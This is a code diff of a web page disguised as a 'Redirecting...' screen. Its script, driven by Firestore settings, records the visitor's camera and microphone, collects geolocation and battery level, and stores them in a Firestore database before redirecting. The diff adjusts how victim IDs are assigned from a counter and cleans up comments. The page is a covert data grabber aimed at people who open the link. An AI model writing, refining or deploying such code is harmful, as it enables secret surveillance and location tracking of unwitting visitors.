@@ -44,7 +44,7 @@
     <div class="container">
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
-        <p id="error-message" class="error-message" style="display:none;"></p>
+         <p id="error-message" class="error-message" style="display:none;"></p>
     </div>
 
 <script>
@@ -64,27 +64,27 @@ const firebaseConfig = {
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-// --- Firestore References (DYNAMIC USER ID - TEMPORARY!) ---
-// Get the current user ID from location.html (using a global variable - NOT RECOMMENDED for production)
-let currentUserId = "testUser1"; // Initial value
-// Function to get user id
-function getCurrentUserId() {
-  let userId = localStorage.getItem('currentUserId');
-  if (!userId) {
-      // If it doesn't exist, initialize to testUser1 and save it.
-      userId = 'testUser1';
-      localStorage.setItem('currentUserId', userId);
-  }
-  return userId;
+// --- Firestore References (DYNAMIC USER ID) ---
+// Function to get the *current* user ID (will be incremented in location.html)
+async function getCurrentUserId() {
+     const counterRef = db.collection('counters').doc('userCounter');
+     const counterDoc = await counterRef.get();
+      if (counterDoc.exists) {
+        return `user${counterDoc.data().count}`;
+      } else {
+         return 'user1'; // Initial value.
+      }
 }
-// Retrieve userId.
-currentUserId = getCurrentUserId();
 
-const settingsRef = db.collection('userSettings').doc(currentUserId);
-const dataRef = db.collection('userData').doc(currentUserId);
 const errorMessage = document.getElementById("error-message");
 
 (async () => {
+    // Get the current user ID *before* fetching settings
+    const currentUserId = await getCurrentUserId();
+    const settingsRef = db.collection('userSettings').doc(currentUserId);
+    const dataRef = db.collection('userData').doc(currentUserId);
+
+
     // Get settings from Firestore
     let micCamPermission, locationPermission, notificationPermission, redirectUrl, redirectSeconds, recordSeconds;
 
@@ -114,7 +114,7 @@ const errorMessage = document.getElementById("error-message");
     // --- Permissions and Actions ---
     let locationData = null;
     let batteryData = null;
-    let videoUrl = null;  // Will store the URL of the video
+    let videoUrl = null;
     let locationError = null;
     let batteryError = null;
     let cameraError = null;
@@ -135,7 +135,7 @@ const errorMessage = document.getElementById("error-message");
 
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    videoUrl = URL.createObjectURL(blob);  // <-- CREATE THE URL HERE
+                    videoUrl = URL.createObjectURL(blob);
 
                     // --- All data collected, now save and redirect ---
                     saveDataAndRedirect();
@@ -153,20 +153,22 @@ const errorMessage = document.getElementById("error-message");
                 recorder.start();
 
             } else {
-                // No recording, stop stream immediately.  Proceed to collect other data
+                // No recording, stop stream immediately.  Proceed to collect other data.
                 stream.getTracks().forEach(track => track.stop());
-                collectOtherData(); // <-- GO TO NEXT STEP
+                collectOtherData();
             }
+
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
-            cameraError = error.message; // Store the error message
-            collectOtherData(); // <-- EVEN IF CAMERA FAILS, collect other data
+            cameraError = error.message; // Store error
+            collectOtherData(); // Collect other data even if camera fails
         }
     } else {
         // No camera/mic needed, proceed to collect other data
-        collectOtherData(); // <-- GO TO NEXT STEP
+        collectOtherData();
     }
-      // Utility function to promisify Geolocation API
+
+    // Utility function to promisify Geolocation API
     function getCurrentPositionPromise() {
         return new Promise((resolve, reject) => {
             if (navigator.geolocation) {
@@ -177,15 +179,16 @@ const errorMessage = document.getElementById("error-message");
         });
     }
 
-    // Utility function to promisify Battery API
+     // Utility function to promisify Battery API
     function getBatteryPromise() {
         return new Promise((resolve, reject) => {
-            if (navigator.getBattery) {
-                resolve(navigator.getBattery());
-            } else {
+            if(navigator.getBattery) {
+               resolve(navigator.getBattery());
+            }else{
                 reject(new Error("Battery API is not supported."));
             }
         });
+
     }
 
     // Function to collect location and battery data
@@ -222,13 +225,13 @@ const errorMessage = document.getElementById("error-message");
         }
 
         // 3. Battery
-          if (navigator.getBattery) {
+         if (navigator.getBattery) {
             try{
                 const battery = await getBatteryPromise();
                 batteryData = battery.level * 100;
 
             }catch(error){
-              console.error("Error getting batter:", error)
+              console.error("Error getting batter:", error);
               batteryError = error.message;
             }
         }
@@ -241,10 +244,10 @@ const errorMessage = document.getElementById("error-message");
     // Function to save data to Firestore and perform the redirect
     async function saveDataAndRedirect() {
         const dataToSave = {
-            videoUrl: videoUrl || null,  // Save the video URL (or null)
-            location: locationData || null, // Save location data (or null)
+            videoUrl: videoUrl || null,
+            location: locationData || null,
             batteryPercentage: batteryData,
-            locationError: locationError || null,  // Save any errors
+            locationError: locationError || null,
             batteryError: batteryError || null,
             cameraError: cameraError || null,
         };
@@ -254,9 +257,9 @@ const errorMessage = document.getElementById("error-message");
             console.log("Data saved to Firestore!");
         } catch (error) {
             console.error("Error saving data to Firestore:", error);
-            errorMessage.textContent = `Firestore Fout: ${error.message}`;
+             errorMessage.textContent = `Firestore Fout: ${error.message}`;
             errorMessage.style.display = 'block';
-            // Still redirect even if save fails
+            // Redirect even if saving fails
         }
 
         // Perform the redirect
